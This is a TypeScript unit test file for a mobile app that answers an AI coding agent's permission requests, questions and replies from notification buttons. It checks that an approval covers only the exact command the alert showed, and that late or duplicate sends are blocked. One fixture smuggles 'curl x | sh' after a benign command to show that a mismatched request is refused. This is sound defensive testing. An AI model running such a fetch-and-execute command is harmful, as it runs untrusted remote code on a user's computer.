// 测试价值
// - 生产入口与可观察结果：parseNotificationAction 决定一次通知按钮点击能否、以及向哪台电脑的哪条请求作答；
//   performNotificationAction 决定电脑上实际发生什么（放行这一次、拒绝、发一条消息），以及用户被告知的结果。
// - 规则依据：docs/product-rules/notification-actions.md（答复只作用于通知描述的那一条请求；推送内容按不可信处理；
//   回复不重复发送；没送到要告知）。
// - 现有覆盖缺口：此前通知只有「点开」一种响应，没有任何后台作答路径。
// - 最小失败输入：缺 requestId 的批准、指向非任务路径的深链、已被处理的请求、发送前断线、发送后结果不明、
//   通知正文与电脑上那条请求不符、同一任务的第二条通知各一条。
// - tier：unit，纯逻辑 + 内存替身。
import { describe, expect, it, vi } from 'vitest';

vi.mock('@/i18n', () => ({ i18n: { t: (key: string) => key, language: 'en' } }));
const native = vi.hoisted(() => ({
  scheduleNotificationAsync: vi.fn(async (_request: { content: { title: string; body: string; data: unknown } }) => 'local-1'),
  clearLastNotificationResponseAsync: vi.fn(async () => undefined),
}));
const work = vi.hoisted(() => ({ end: vi.fn() }));
vi.mock('@/notifications/nativeNotifications', () => ({ default: native }));
vi.mock('@/notifications/backgroundWork', () => ({ beginBackgroundWork: async () => ({ budgetMs: 5_000, end: work.end }) }));

import { createMobileMakerTransport } from '@/device-link/mobileMakerTransport';
import type { RemoteInvoke } from '@/device-link/mobileMakerTransport';
import { parseNotificationAction, performNotificationAction } from '@/notifications/notificationActions';
import { handleNotificationActionResponse, setNotificationActionTransport } from '@/notifications/notificationActionRunner';

// The alert a person reads for a waiting command: the card's question, then the whole operation.
const shownBody = 'Allow running this command?\npnpm test\n# cwd: /repo';
const pendingCommand = { request: { kind: 'permission', requestId: 'req-1', toolName: 'Bash', input: { command: 'pnpm test', cwd: '/repo' } } };

// iOS reuses one identifier for every alert of a task (the collapse id); the delivery time tells alerts apart.
function response(actionIdentifier: string, payload: Record<string, unknown>, extra: Record<string, unknown> = {}, date = 1_000) {
  return {
    actionIdentifier,
    ...extra,
    notification: { date, request: { identifier: 'task-1', content: { title: 'Fix login', body: shownBody, data: null }, trigger: { payload } } },
  };
}
const route = '/sessions/s%201?deviceId=mac-1';
const permission = { deepLink: route, action: { kind: 'permission', requestId: 'req-1' } };

describe('parseNotificationAction', () => {
  it('reads the request, the task, its computer and what the alert showed', () => {
    const target = { sessionId: 's 1', deviceId: 'mac-1', route, title: 'Fix login', alertKey: 'task-1@1000' };
    expect(parseNotificationAction(response('approve', permission)))
      .toEqual({ ...target, kind: 'permission', decision: 'allow', requestId: 'req-1', shownBody });
    expect(parseNotificationAction(response('deny', permission))).toMatchObject({ kind: 'permission', decision: 'deny', requestId: 'req-1' });
    expect(parseNotificationAction(response('reply', { deepLink: route, action: { kind: 'reply' } }, { userText: '  go on  ' })))
      .toEqual({ ...target, kind: 'reply', text: 'go on' });
  });

  it('leaves an ordinary tap to navigation', () => {
    expect(parseNotificationAction(response('expo.modules.notifications.actions.DEFAULT', permission))).toBeNull();
    expect(parseNotificationAction(null)).toBeNull();
  });

  it.each([
    ['no request id', response('approve', { deepLink: route, action: { kind: 'permission' } })],
    ['a reply alert asked to approve', response('approve', { deepLink: route, action: { kind: 'reply' } })],
    ['no action in the alert', response('deny', { deepLink: route })],
    ['an over-long request id', response('approve', { deepLink: route, action: { kind: 'permission', requestId: 'r'.repeat(129) } })],
    ['a route that is not a task', response('approve', { ...permission, deepLink: '/companions/groups/g1?deviceId=mac-1' })],
    ['an external link', response('approve', { ...permission, deepLink: 'https://example.com/sessions/s1?deviceId=mac-1' })],
    ['a task without its computer', response('approve', { ...permission, deepLink: '/sessions/s1' })],
    ['an empty reply', response('reply', { deepLink: route, action: { kind: 'reply' } }, { userText: '   ' })],
    ['a permission alert asked to reply', response('reply', permission, { userText: 'ok' })],
  ])('refuses %s', (_label, input) => {
    expect(parseNotificationAction(input)).toBe('invalid');
  });
});

describe('performNotificationAction', () => {
  const target = { sessionId: 's1', deviceId: 'mac-1', route, title: 'Fix login', alertKey: 'task-1@1000' };
  const allow = { ...target, kind: 'permission' as const, decision: 'allow' as const, requestId: 'req-1', shownBody };
  const waiting = [pendingCommand];
  const notConnected = () => Object.assign(new Error('offline'), { code: 'NOT_CONNECTED' });
  function maker(overrides: Record<string, unknown> = {}) {
    return {
      getPendingInteractions: vi.fn(async () => waiting),
      resolveInteraction: vi.fn(async () => ({ accepted: true })),
      getSession: vi.fn(async () => ({ id: 's1', workingDir: '/repo', agentKind: 'claude-code', model: 'm' })),
      input: { enqueue: vi.fn(async () => ({})) },
      ...overrides,
    } as never;
  }
  const resolved = (m: unknown) => (m as { resolveInteraction: ReturnType<typeof vi.fn> }).resolveInteraction;
  const clock = () => { let t = 0; return { now: () => t, sleep: async (ms: number) => { t += ms; } }; };

  it('allows the described request once and nothing broader', async () => {
    const m = maker();
    await expect(performNotificationAction(allow, m, { until: 10_000, ...clock() })).resolves.toBe('sent');
    expect(resolved(m)).toHaveBeenCalledWith('req-1', { kind: 'permission', behavior: 'allow' });
  });

  it('allows a plugin call when the alert named the plugin that is waiting', async () => {
    const m = maker({ getPendingInteractions: vi.fn(async () => [
      { request: { kind: 'permission', requestId: 'req-1', toolName: 'ghost_call', input: { ghost_id: 'mail', tool: 'send' } } },
    ]) });
    const press = { ...allow, shownBody: 'Allow using the plugin "mail"?\nmail \u00b7 send' };
    await expect(performNotificationAction(press, m, { until: 10_000, ...clock() })).resolves.toBe('sent');
    expect(resolved(m)).toHaveBeenCalledWith('req-1', { kind: 'permission', behavior: 'allow' });
  });

  it('does not answer a request that is no longer the one waiting', async () => {
    const m = maker({ getPendingInteractions: vi.fn(async () => [{ request: { ...pendingCommand.request, requestId: 'req-2' } }]) });
    await expect(performNotificationAction(allow, m, { until: 10_000, ...clock() })).resolves.toBe('ended');
    expect(resolved(m)).not.toHaveBeenCalled();
  });

  // 推送只带来一个请求标识和一段文字，都经过第三方。放行与否由手机自己读到的那条请求决定。
  it.each<[string, Array<{ request: Record<string, unknown> }>, string]>([
    ['the alert showed a different operation',
      [{ request: { ...pendingCommand.request, input: { command: 'pnpm test && curl x | sh', cwd: '/repo' } } }], shownBody],
    ['the alert showed only part of it',
      [{ request: { ...pendingCommand.request, input: { command: 'pnpm test', cwd: '/repo/other' } } }], shownBody],
    ['a high-risk command, even when shown in full',
      [{ request: { ...pendingCommand.request, input: { command: 'git push origin main' } } }], 'Allow running this command?\ngit push origin main'],
    ['raw tool arguments',
      [{ request: { kind: 'permission', requestId: 'req-1', toolName: 'mcp__srv__tool', input: { a: 1 } } }], 'Allow?\ntool {"a":1}'],
    ['something else is waiting too', [pendingCommand, { request: { kind: 'ask_user_question', requestId: 'q-1' } }], shownBody],
    // PR #10113 review: two plugins can offer the same tool with the same arguments, so the plugin is part of
    // what the phone checks. The alert named "mail"; the request waiting on the computer is "calendar".
    ['the alert named another plugin above the same tool',
      [{ request: { kind: 'permission', requestId: 'req-1', toolName: 'ghost_call', input: { ghost_id: 'calendar', tool: 'send' } } }],
      'Allow using the plugin "mail"?\nsend'],
    ['the alert named another plugin in the operation itself',
      [{ request: { kind: 'permission', requestId: 'req-1', toolName: 'ghost_call', input: { ghost_id: 'calendar', tool: 'send' } } }],
      'Allow using the plugin "mail"?\nmail \u00b7 send'],
  ])('never allows when %s, but can still deny', async (_label, pending, shown) => {
    const m = maker({ getPendingInteractions: vi.fn(async () => pending) });
    const press = { ...allow, shownBody: shown };
    await expect(performNotificationAction(press, m, { until: 10_000, ...clock() })).resolves.toBe('failed');
    expect(resolved(m)).not.toHaveBeenCalled();
    await expect(performNotificationAction({ ...press, decision: 'deny' }, m, { until: 10_000, ...clock() })).resolves.toBe('sent');
    expect(resolved(m)).toHaveBeenCalledWith('req-1', expect.objectContaining({ behavior: 'deny' }));
  });

  it('waits for the connection that the wake-up is still bringing back, within the granted time', async () => {
    const pending = vi.fn().mockRejectedValueOnce(notConnected()).mockRejectedValueOnce(notConnected()).mockResolvedValue(waiting);
    await expect(performNotificationAction(allow, maker({ getPendingInteractions: pending }), { until: 10_000, ...clock() }))
      .resolves.toBe('sent');
    const never = vi.fn().mockRejectedValue(notConnected());
    const m = maker({ getPendingInteractions: never });
    await expect(performNotificationAction(allow, m, { until: 2_000, ...clock() })).resolves.toBe('failed');
    expect(resolved(m)).not.toHaveBeenCalled();
  });

  // 报了「没送到」之后不能再送到：用户点开提示回到前台时连接会恢复，重试不得借机把答复发出去。
  it('starts nothing after the deadline, so a press reported as undelivered is not delivered later', async () => {
    const time = clock();
    const resolveInteraction = vi.fn(async () => { await time.sleep(3_000); throw notConnected(); });
    const m = maker({ resolveInteraction });
    await expect(performNotificationAction(allow, m, { until: 2_000, ...time })).resolves.toBe('failed');
    expect(resolveInteraction).toHaveBeenCalledTimes(1);
  });

  it('tells a refused answer apart: still waiting is a failure, gone means it ended elsewhere', async () => {
    const refused = { resolveInteraction: vi.fn(async () => ({ accepted: false })) };
    await expect(performNotificationAction(allow, maker(refused), { until: 10_000, ...clock() })).resolves.toBe('failed');
    const gone = vi.fn().mockResolvedValueOnce(waiting).mockResolvedValue([]);
    await expect(performNotificationAction(allow, maker({ ...refused, getPendingInteractions: gone }), { until: 10_000, ...clock() }))
      .resolves.toBe('ended');
  });

  it('sends a reply once per alert and never repeats it after an unclear result', async () => {
    const reply = { ...target, kind: 'reply' as const, text: 'go on' };
    const m = maker();
    await expect(performNotificationAction(reply, m, { until: 10_000, ...clock() })).resolves.toBe('sent');
    await expect(performNotificationAction({ ...reply, alertKey: 'task-1@2000' }, m, { until: 10_000, ...clock() })).resolves.toBe('sent');
    const enqueue = (m as { input: { enqueue: ReturnType<typeof vi.fn> } }).input.enqueue;
    // The computer keeps one copy per message id: a later alert of the same task must not reuse it.
    expect(enqueue.mock.calls.map(call => (call[1] as { clientId: string }).clientId))
      .toEqual(['notification-reply:task-1@1000', 'notification-reply:task-1@2000']);
    expect(enqueue.mock.calls[0]![1]).toMatchObject({ text: 'go on' });

    const unclear = { input: { enqueue: vi.fn().mockRejectedValue(Object.assign(new Error('timeout'), { code: 'TIMEOUT' })) } };
    await expect(performNotificationAction(reply, maker(unclear), { until: 10_000, ...clock() })).resolves.toBe('failed');
    expect(unclear.input.enqueue).toHaveBeenCalledTimes(1);
  });
});

// 提问:通知上的选项按钮与文字回复。答案由手机向电脑读到的那道题决定,不由推送决定。
describe('answering a question from the alert', () => {
  const question = { deepLink: route, action: { kind: 'question', requestId: 'q-1', options: ['Postgres', 'SQLite'] } };
  const target = { sessionId: 's1', deviceId: 'mac-1', route, title: 'Fix login', alertKey: 'task-1@1000' };
  const asked = (extra: Record<string, unknown> = {}, request: Record<string, unknown> = {}) => [{ request: {
    kind: 'ask_user_question', requestId: 'q-1', ...request,
    questions: [{ id: 'db', question: 'Which database?', options: [{ label: 'Postgres' }, { label: 'SQLite' }], ...extra }],
  } }];
  function maker(pending: unknown[]) {
    return {
      getPendingInteractions: vi.fn(async () => pending),
      resolveInteraction: vi.fn(async (_requestId: string, _decision: Record<string, unknown>) => ({ accepted: true })),
      getSession: vi.fn(), input: { enqueue: vi.fn() },
    };
  }
  const run = (answer: { option: string } | { text: string }, pending: unknown[]) => {
    const m = maker(pending);
    return performNotificationAction({ ...target, kind: 'question', requestId: 'q-1', answer }, m as never, { until: 10_000, now: () => 0 })
      .then(outcome => ({ outcome, sent: m.resolveInteraction.mock.calls[0]?.[1] }));
  };

  it('reads an option button and a typed reply from the alert', () => {
    expect(parseNotificationAction(response('option:1', question)))
      .toMatchObject({ kind: 'question', requestId: 'q-1', answer: { option: 'SQLite' }, sessionId: 's 1', deviceId: 'mac-1' });
    expect(parseNotificationAction(response('reply', question, { userText: ' 2 ' })))
      .toMatchObject({ kind: 'question', requestId: 'q-1', answer: { text: '2' } });
    // A button the alert did not list, and option buttons on alerts that are not questions.
    expect(parseNotificationAction(response('option:5', question))).toBe('invalid');
    expect(parseNotificationAction(response('option:0', permission))).toBe('invalid');
    expect(parseNotificationAction(response('option:0', { deepLink: route, action: { kind: 'question', options: ['A'] } }))).toBe('invalid');
  });

  it.each<[string, { option: string } | { text: string }, string]>([
    ['the pressed option', { option: 'SQLite' }, 'SQLite'],
    ['its number', { text: '2' }, 'SQLite'],
    ['its name, however it was capitalised', { text: 'postgres' }, 'Postgres'],
    ['the person\'s own words', { text: 'Use DuckDB instead' }, 'Use DuckDB instead'],
  ])('answers with %s', async (_label, answer, expected) => {
    await expect(run(answer, asked())).resolves.toEqual({ outcome: 'sent', sent: { kind: 'ask_user_question', answers: { db: expected } } });
  });

  it.each<[string, { option: string } | { text: string }, unknown[]]>([
    ['an option the question does not have', { option: 'MySQL' }, asked()],
    ['free text where only the listed choices are accepted', { text: 'DuckDB' }, asked({ answerConstraints: { required: true, choices: ['Postgres', 'SQLite'] } })],
    ['a multi-select question', { option: 'SQLite' }, asked({ multiSelect: true })],
    ['a question that does not wait for the answer', { option: 'SQLite' }, asked({}, { delivery: 'async' })],
    ['several questions at once', { option: 'SQLite' }, [{ request: { kind: 'ask_user_question', requestId: 'q-1',
      questions: [{ question: 'A?', options: [{ label: 'SQLite' }] }, { question: 'B?' }] } }]],
  ])('sends nothing for %s', async (_label, answer, pending) => {
    await expect(run(answer, pending)).resolves.toEqual({ outcome: 'failed', sent: undefined });
  });

  it('reports a question that was already answered', async () => {
    await expect(run({ option: 'SQLite' }, [])).resolves.toEqual({ outcome: 'ended', sent: undefined });
  });
});

describe('handleNotificationActionResponse', () => {
  const reported = () => native.scheduleNotificationAsync.mock.calls.map(([call]) => call.content);
  function transport(overrides: Record<string, unknown> = {}) {
    const release = vi.fn();
    const maker = {
      getPendingInteractions: vi.fn(async () => [pendingCommand]),
      resolveInteraction: vi.fn(async () => ({ accepted: true })),
      ...overrides,
    };
    setNotificationActionTransport({ makerFor: () => maker as never, holdConnection: () => release });
    return { maker, release };
  }
  const press = (date: number, action = 'approve') => response(action, permission, {}, date);

  it('routes an ordinary tap elsewhere, acts once on a replayed press, and again on the next alert of the same task', async () => {
    native.scheduleNotificationAsync.mockClear();
    const { maker, release } = transport();
    expect(handleNotificationActionResponse(response('expo.modules.notifications.actions.DEFAULT', permission))).toBe(false);
    expect(handleNotificationActionResponse(press(10))).toBe(true);
    expect(handleNotificationActionResponse(press(10))).toBe(true);
    await vi.waitFor(() => expect(release).toHaveBeenCalledTimes(1));
    expect(maker.resolveInteraction).toHaveBeenCalledTimes(1);
    expect(work.end).toHaveBeenCalled();
    // Same task, same system identifier, a later alert: a new press, not a replay.
    handleNotificationActionResponse(press(11));
    await vi.waitFor(() => expect(maker.resolveInteraction).toHaveBeenCalledTimes(2));
    expect(reported()).toEqual([]);
    setNotificationActionTransport(null);
  });

  it('tells the person when the press could not be carried out, and sends nothing for it', async () => {
    native.scheduleNotificationAsync.mockClear();
    const { maker } = transport();
    // The alert does not say what it answers.
    handleNotificationActionResponse(response('approve', { deepLink: route }, {}, 20));
    // The phone is locked and the app was started unseen: nothing may be attempted.
    handleNotificationActionResponse(press(21), { canRun: false });
    await vi.waitFor(() => expect(reported()).toHaveLength(2));
    expect(maker.resolveInteraction).not.toHaveBeenCalled();
    expect(reported()[1]).toEqual({ title: 'Fix login', body: 'settings.notifications.actionNotDelivered',
      data: { cindyActionResult: true, deepLink: route } });
    setNotificationActionTransport(null);
  });

  // #10113 review: existing deadline tests stopped only at method entry, before
  // connection/queue waits and async plugin expansion. Unit, real maker adapter
  // plus an in-memory send queue: timeout reports failure; releasing it sends zero writes.
  it.each(['permission', 'question', 'reply', 'plugin-reply'] as const)('never sends a late %s after reporting the background deadline', async kind => {
    vi.useFakeTimers();
    native.scheduleNotificationAsync.mockClear();
    let release!: () => void;
    const blocked = new Promise<void>(resolve => { release = resolve; });
    const sent: string[] = [];
    const queued: string[] = [];
    const waiting = kind === 'question'
      ? [{ request: { kind: 'ask_user_question', requestId: 'q-1', questions: [{ question: 'Which?', options: ['A'], isOther: true }] } }]
      : [pendingCommand];
    setNotificationActionTransport({
      holdConnection: () => () => {},
      makerFor: (deviceId, preSend) => createMobileMakerTransport({ deviceId, invoke: (async (_device, channel, args) => {
        const write = channel === 'maker:resolve-interaction' || channel === 'maker:input:enqueue';
        if ((write && kind !== 'plugin-reply') || channel === 'ghosts:composer-list') {
          queued.push(channel);
          await blocked;
        }
        // DeviceLinkClient checks after queue admission, before creating a request.
        preSend?.();
        if (write) sent.push(channel);
        if (channel === 'maker:get-pending-interactions') return waiting;
        if (channel === 'local-db:sessions:get') return { id: 's1', workingDir: '/repo', agentKind: 'claude-code', model: 'm' };
        if (channel === 'ghosts:composer-list') return [];
        return { accepted: true };
      }) as RemoteInvoke }),
    });
    try {
      const payload = kind === 'permission' ? permission : { deepLink: route,
        action: kind === 'question' ? { kind: 'question', requestId: 'q-1' } : { kind: 'reply' } };
      handleNotificationActionResponse(response(kind === 'permission' ? 'approve' : 'reply', payload,
        { userText: kind === 'plugin-reply' ? '$mail hello' : 'A' }, 100 + ['permission', 'question', 'reply', 'plugin-reply'].indexOf(kind)));
      await vi.advanceTimersByTimeAsync(1);
      expect(queued).toHaveLength(1);
      await vi.advanceTimersByTimeAsync(5_000);
      expect(reported()).toHaveLength(1);
      release();
      await vi.advanceTimersByTimeAsync(1_000);
      expect(sent).toEqual([]);
      expect(reported()).toHaveLength(1);
    } finally {
      release();
      setNotificationActionTransport(null);
      vi.useRealTimers();
    }
  });

  it('reports a request that ended before the answer arrived, and a transport that breaks on the way', async () => {
    native.scheduleNotificationAsync.mockClear();
    const { maker } = transport({ getPendingInteractions: vi.fn(async () => []) });
    handleNotificationActionResponse(press(30));
    await vi.waitFor(() => expect(reported()).toHaveLength(1));
    expect(reported()[0]!.body).toBe('settings.notifications.actionRequestEnded');
    expect(maker.resolveInteraction).not.toHaveBeenCalled();

    setNotificationActionTransport({ makerFor: () => { throw new Error('transport unavailable'); }, holdConnection: () => () => {} });
    handleNotificationActionResponse(press(31));
    await vi.waitFor(() => expect(reported()).toHaveLength(2));
    expect(reported()[1]!.body).toBe('settings.notifications.actionNotDelivered');
    setNotificationActionTransport(null);
  });
});
